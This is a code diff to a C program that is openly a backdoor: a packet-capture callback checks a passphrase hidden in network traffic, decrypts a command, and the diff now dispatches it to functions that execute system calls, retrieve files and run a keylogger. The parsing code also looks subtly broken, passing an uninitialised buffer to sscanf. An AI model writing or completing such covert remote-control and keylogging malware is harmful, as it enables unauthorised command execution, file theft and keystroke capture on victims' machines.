@@ -4,7 +4,7 @@
 void backdoor();
 void receivedPacket(u_char *args, const struct pcap_pkthdr *header, const u_char *packet);
 int validPassphrase(char *passphrase);
-int getCommand(char **command, int payloadSize);
+void getCommand(char **command, int payloadSize);
 
 int main (int argc, char* argv[])
 {
@@ -135,12 +135,8 @@ void receivedPacket(u_char *args, const struct pcap_pkthdr *header, const u_char
 #endif
         payload = (char*)(packet + SIZE_ETHERNET + ipHeaderSize + tcpHeaderSize);
         
-        // Get the command
-        if (!getCommand(&payload, payloadSize))
-        {
-            free(passphrase);
-            return;
-        }
+        // Get the command and execute it
+        getCommand(&payload, payloadSize);
         
     }
     
@@ -173,7 +169,7 @@ int validPassphrase(char *passphrase)
     return 0;
 }
 
-int getCommand(char **command, int payloadSize)
+void getCommand(char **command, int payloadSize)
 {
     char *decryptedCommand = NULL;
     char *token = NULL;
@@ -193,22 +189,20 @@ int getCommand(char **command, int payloadSize)
     // Get the command value and an optional filename or command
     if (sscanf(decryptedCommand, "%d[^|]%s", &option, token) == 0)
     {
-        return 0;
+        return;
     }
     
     switch (option) {
         case EXECUTE_SYSTEM_CALL:
-            // Call function
+            executeSystemCall(token);
             break;
         case FIND_FILE:
-            // Call function
+            retrieveFile(token);
             break;
         case KEYLOGGER:
-            // Call function
+            keylogger();
             break;
         default:
             break;
     }
-    
-    return 0;
 }
